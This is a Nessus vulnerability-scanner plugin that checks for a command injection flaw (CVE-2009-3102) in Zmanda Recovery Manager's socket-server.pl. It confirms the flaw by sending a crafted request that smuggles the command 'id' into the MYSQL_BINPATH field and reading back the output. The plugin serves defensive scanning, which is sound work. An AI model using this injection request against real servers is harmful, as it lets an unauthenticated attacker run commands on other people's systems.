#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(40886);
  script_version("1.16");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2009-3102");
  script_bugtraq_id(42417);
  script_xref(name:"SECUNIA", value:"36424");

  script_name(english:"Zmanda Recovery Manager for MySQL socket-server.pl MYSQL_BINPATH Variable Command Execution");

  script_set_attribute(attribute:"synopsis", value:
"The remote backup service allows execution of arbitrary code.");
  script_set_attribute(attribute:"description", value:
"The remote service appears to be Zmanda Recovery Manager (ZRM) for
MySQL's socket-server.pl.  ZRM for MySQL offers a backup and recovery
solution for MySQL, and the socket-server.pl component typically runs
on a MySQL server out of xinetd to support remote operations.

The installed version of socket-server.pl fails to sanitize user input
to the 'MYSQL_BINPATH' variable before using it in a 'system()' call.
An unauthenticated, remote attacker can leverage this issue to execute
arbitrary commands on the remote host subject to the privileges under
which the service runs, typically 'mysql'.");
  script_set_attribute(attribute:"see_also", value:"http://www.intevydis.com/blog/?p=51");
  script_set_attribute(attribute:"see_also", value:"http://forums.zmanda.com/showthread.php?2144-PLEASE-READ-Please-upgrade-to-ZRM-community-release-2-1-1");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Zmanda ZRM 2.1.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:U/RL:O/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_cwe_id(20);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/08/25");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/08/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/09/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("find_service2.nasl");
  script_require_ports("Services/unknown", 25300);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("data_protection.inc");


if (
  thorough_tests &&
  !get_kb_item("global_settings/disable_service_discovery")
)
{
  port = get_unknown_svc(25300);
  if (!port) exit(0, "There are no unknown services.");
  if (!silent_service(port)) exit(0, "ZRM Socket Server is silent, and the service on port "+port+" is not.");
}
else port = 25300;
if (known_service(port:port)) exit(0, "The service is already known on port "+port+".");
if (!get_tcp_port_state(port)) exit(1, "Port "+port+" is not open.");


cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";
versions = make_list(
  "1.6",                                    # version 2.0
  "1.2"                                     # versions 1.1.3 - 1.1.5
);


foreach version (versions)
{
  soc = open_sock_tcp(port);
  if (!soc) exit(1, "Can't open socket on port "+port+".");

  # Try to exploit the issue.
  req = string(
    version, "\n",
    "mysqlhotcopy\n",
    SCRIPT_NAME, "\n",
    "/tmp\n",
    cmd, ";\n"
  );
  send(socket:soc, data:req);

  res = recv(socket:soc, length:1024, min:32);
  close(soc);

  if (strlen(res) && egrep(pattern:cmd_pat, string:res))
  {
    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to execute the command '", cmd, "' on the remote \n",
        "host by sending the following request :\n",
        "\n",
        crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
        req,
        crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
      );
      if (report_verbosity > 1)
      {
        output = chomp(res);
        report = string(
          report,
          "\n",
          "This produced the following output :\n",
          "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
          data_protection::sanitize_uid(output:output), "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
        );
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
